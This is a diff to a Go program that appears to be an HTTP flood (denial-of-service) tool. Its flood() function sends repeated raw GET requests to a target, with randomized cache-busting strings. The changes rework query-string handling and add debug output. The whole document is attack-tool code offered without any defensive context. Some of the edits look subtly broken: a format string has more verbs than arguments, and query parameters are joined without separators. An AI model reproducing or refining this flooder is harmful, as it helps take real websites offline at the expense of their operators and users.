@@ -204,9 +204,12 @@ func flood() {
 				request := ""
 				if os.Args[3] == "get" {
 					request += "GET " + page + key
-					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
+					if len(key) == 0 {
+						request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
+					}
 				}
 				request += header + "\r\n"
+				//fmt.Printf("\n\nRequesting %s %s\n\n", addr, request)
 				if _, err := s.Write([]byte(request)); err == nil && i == 0 {
 					tmp := make([]byte, 256)
 					if _, err := s.Read(tmp); err == nil {
@@ -217,6 +220,8 @@ func flood() {
 						} else {
 							fmt.Println("BAD")
 						}
+					} else {
+						fmt.Println(err)
 					}
 				}
 			}
@@ -243,6 +248,8 @@ func main() {
 		os.Exit(1)
 	}
 	u, err := url.Parse(os.Args[1])
+	values := u.Query()
+	fmt.Printf("\nParsed url %s %s %s %s %s\n", u.Scheme, u.Host, u.Path, values)
 	if err != nil {
 		println("Please input a correct url")
 	}
@@ -270,10 +277,11 @@ func main() {
 	if err != nil {
 		fmt.Println("limit should be a integer")
 	}
-	if contain(page, "?") == 0 {
-		key = "?"
-	} else {
-		key = "&"
+	if len(values) > 0 {
+		key += "?"
+		for k, v := range u.Query() {
+			key += k + "=" + v[0]
+		}
 	}
 	input := bufio.NewReader(os.Stdin)
 
